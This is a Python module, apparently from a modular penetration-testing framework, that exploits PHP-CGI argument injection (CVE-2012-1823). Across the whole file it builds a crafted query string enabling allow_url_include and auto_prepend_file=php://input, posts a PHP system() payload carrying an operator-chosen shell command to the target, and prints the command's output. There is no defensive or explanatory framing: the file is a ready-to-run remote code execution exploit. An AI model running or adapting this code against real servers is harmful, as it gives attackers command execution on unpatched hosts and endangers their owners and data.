import requests
from core.base_module import BaseModule
from rich.console import Console

class PhpCgiRce(BaseModule):
    """Exploits PHP-CGI argument injection (CVE-2012-1823)."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'RHOST': ['', 'The target host URL (e.g., http://example.com/index.php).'],
            'CMD': ['id', 'The command to execute on the target.']
        }

    def run(self, options):
        """
        Executes the PHP-CGI RCE exploit.
        """
        rhost = options.get('RHOST')
        cmd = options.get('CMD')
        console = Console()

        if not rhost:
            console.print("[!] RHOST must be set.", style="bold red")
            return

        # The payload that triggers the vulnerability
        payload = f"<?php system('{cmd}'); die(); ?>"
        # The URL needs the query string to trigger the CGI mode
        target_url = f"{rhost}?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"

        console.print(f"[*] Targeting PHP-CGI at: {rhost}")
        console.print(f"[*] Sending payload to execute: {cmd}")

        try:
            response = requests.post(target_url, data=payload, timeout=20, verify=False)

            if response.status_code == 200 and response.text.strip():
                # The output is usually clean, but we'll strip whitespace just in case
                output = response.text.strip()
                console.print("[bold green][+] Command executed successfully![/bold green]")
                console.print(f"--- Command Output ---\\n{output}\\n----------------------")
            else:
                console.print(f"[!] Exploit failed. The server may not be vulnerable.", style="bold red")
                console.print(f"Status: {response.status_code}, Response: {response.text[:200]}")

        except requests.RequestException as e:
            console.print(f"[!] Request failed: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")